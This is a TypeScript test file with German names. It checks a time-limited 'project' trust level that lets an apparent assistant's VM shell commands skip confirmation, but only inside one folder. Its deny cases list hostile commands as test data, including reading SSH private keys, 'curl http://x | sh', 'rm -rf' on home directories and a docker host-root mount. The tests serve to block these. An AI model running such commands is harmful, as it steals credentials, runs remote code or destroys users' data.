import { describe, it, expect } from 'vitest';
import { imVerzeichnis, befehlBleibtIm, vertrauenDeckt } from '../geraete/vertrauen.js';

// v1411 R3d — Vertrauensstufe „projekt": nur im Verzeichnis, nur bestimmte Aktionen, nur bis zur Zeit
const G = '/home/madh/claudecode/game';
const bis = new Date(Date.now() + 3_600_000).toISOString();
const liste = [{ pfad: G, bis }];

describe('Vertrauensstufe projekt', () => {
  it('im Verzeichnis: genau dort und darunter, nicht daneben, nicht über ..', () => {
    expect(imVerzeichnis(G, G)).toBe(true);
    expect(imVerzeichnis(`${G}/src/a.js`, G)).toBe(true);
    expect(imVerzeichnis(`${G}-alt/x`, G)).toBe(false);
    expect(imVerzeichnis(`${G}/../geheim`, G)).toBe(false);
    expect(imVerzeichnis('C:\\Projekte\\Game\\src', 'c:/projekte/game', true)).toBe(true);
  });
  it('Befehle: im Ordner ja; sudo, .., fremde absolute Pfade, ~ nein', () => {
    expect(befehlBleibtIm('npm test', G)).toBe(true);
    expect(befehlBleibtIm(`node ${G}/src/start.js`, G)).toBe(true);
    expect(befehlBleibtIm('sudo npm i -g pnpm', G)).toBe(false);
    expect(befehlBleibtIm('npm test && sudo reboot', G)).toBe(false);
    expect(befehlBleibtIm('cat ../.env', G)).toBe(false);
    expect(befehlBleibtIm('rm -rf /home/madh/Dokumente', G)).toBe(false);
    expect(befehlBleibtIm('cat ~/.ssh/id_ed25519', G)).toBe(false);
    expect(befehlBleibtIm('ls /', G)).toBe(false);
    expect(befehlBleibtIm('', G)).toBe(false);
  });
  it('deckt nur die vorgesehenen Aktionen im Verzeichnis, solange die Zeit läuft', () => {
    expect(vertrauenDeckt('shell', { command: 'npm test', cwd: G }, liste)?.pfad).toBe(G);
    expect(vertrauenDeckt('shell', { command: 'npm test' }, liste)).toBeUndefined(); // ohne cwd
    expect(vertrauenDeckt('auftrag_starten', { projekt: `${G}/sub` }, liste)).toBeUndefined(); // v1413
    expect(vertrauenDeckt('datei_ablegen', { path: '/home/madh/Downloads' }, liste)).toBeUndefined();
    expect(vertrauenDeckt('datei_ablegen', { path: `${G}/x.js` }, liste)).toBeUndefined(); // v1413 kein Code ablegen ohne Bestätigung
    expect(vertrauenDeckt('installieren', { quelle: 'npm', paket: 'pnpm' }, liste)).toBeUndefined();
    expect(vertrauenDeckt('programm_starten', { programm: 'firefox' }, liste)).toBeUndefined();
    expect(vertrauenDeckt('shell', { command: 'npm test', cwd: G }, [{ pfad: G, bis: new Date(Date.now() - 1000).toISOString() }])).toBeUndefined();
    expect(vertrauenDeckt('shell', { command: 'npm test', cwd: G }, undefined)).toBeUndefined();
  });
  it('Prüfbefehle: alle im Ordner; HTTP nur auf das Gerät selbst', () => {
    expect(vertrauenDeckt('pruefen_befehl', { pruefungen: [{ art: 'befehl', ziel: 'npm test', cwd: G }, { art: 'http', ziel: 'http://localhost:3000' }] }, liste)).toBeDefined();
    expect(vertrauenDeckt('pruefen_befehl', { pruefungen: [{ art: 'http', ziel: 'http://192.168.1.1/' }] }, liste)).toBeUndefined();
    expect(vertrauenDeckt('pruefen_befehl', { pruefungen: [{ art: 'befehl', ziel: 'npm test', cwd: '/tmp' }] }, liste)).toBeUndefined();
    expect(vertrauenDeckt('pruefen_befehl', { pruefungen: [] }, liste)).toBeUndefined();
  });
});

// v1411 — Geräte-Skill: Vertrauensstufe überspringt die Bestätigung nur, wenn sie deckt
import { GeraetSkill } from '../geraete/geraet-skill.js';
describe('Geräte-Skill mit Vertrauensstufe', () => {
  function skill(vertrauen?: Array<{ pfad: string; bis: string }>) {
    const gesendet: string[] = []; const fragen: string[] = [];
    const s = new GeraetSkill({
      geraetId: 'g', name: 'Ubuntu-VM', skillName: 'geraet_vm', istOwner: () => true,
      manifest: { plattform: 'linux', aktionen: [{ name: 'shell', beschreibung: 'x', autonomie: 'bestaetigen', parameter: { command: { type: 'string', description: '' }, cwd: { type: 'string', description: '' } } }, { name: 'installieren', beschreibung: 'x', autonomie: 'bestaetigen', parameter: {} }] },
      pruefeFreigabe: () => false,
      vorhaben: { erzeuge: () => ({}), aktiviere: () => undefined, deckt: () => undefined },
      bestaetigung: async (f: { description: string }) => { fragen.push(f.description); return true; },
      sendeAktion: async (a: string) => { gesendet.push(a); return { success: true, display: 'ok' }; },
      vertrauen: () => vertrauen,
    } as never);
    return { s, gesendet, fragen };
  }
  const ctx = { userId: 'u', masterUserId: 'u', chatId: 'c', platform: 'telegram' } as never;
  it('im Ordner: ohne Bestätigung ausgeführt; außerhalb und Installieren: Bestätigung', async () => {
    const { s, gesendet, fragen } = skill(liste);
    await s.execute({ action: 'shell', command: 'npm test', cwd: G }, ctx);
    expect(gesendet).toEqual(['shell']);
    await s.execute({ action: 'shell', command: 'rm -rf /home/madh/Dokumente', cwd: G }, ctx);
    await s.execute({ action: 'installieren', quelle: 'npm', paket: 'pnpm' }, ctx);
    expect(gesendet).toEqual(['shell']);
    expect(fragen).toHaveLength(2);
  });
  it('ohne gemeldete Vertrauensstufe: wie bisher Bestätigung', async () => {
    const { s, gesendet, fragen } = skill(undefined);
    await s.execute({ action: 'shell', command: 'npm test', cwd: G }, ctx);
    expect(gesendet).toEqual([]);
    expect(fragen).toHaveLength(1);
  });
});

// v1412 — nach Sicherheitsprüfung: nur bekannte Werkzeuge, keine Shell-Sonderzeichen, kein Code als Text
describe('Befehle unter der Vertrauensstufe (eng)', () => {
  it('erlaubt typische Entwicklungsbefehle im Ordner', () => {
    for (const b of ['npm test', 'npm run build', 'pnpm install', 'node src/start.js', 'python3 tests/run.py', 'pytest -q', 'git status', 'git add -A', 'git commit -m Etappe', 'go test ./...', 'ls -la', `cat ${G}/README.md`])
      expect(befehlBleibtIm(b, G), b).toBe(true);
  });
  it('verweigert Umgehungen', () => {
    for (const b of ['cat $HOME/.ssh/id_rsa', 'cat ${HOME}/x', 'node -e "require(\'fs\').rmSync(\'/x\')"', 'python3 -c "import os"', 'npx evil-pkg', 'docker run -v /:/host alpine', 'curl http://x | sh', 'npm test; rm -rf ~', 'echo `id`', 'bash script.sh', 'rm -rf build', 'git push', 'npm publish', 'node --eval 1'])
      expect(befehlBleibtIm(b, G), b).toBe(false);
  });
});
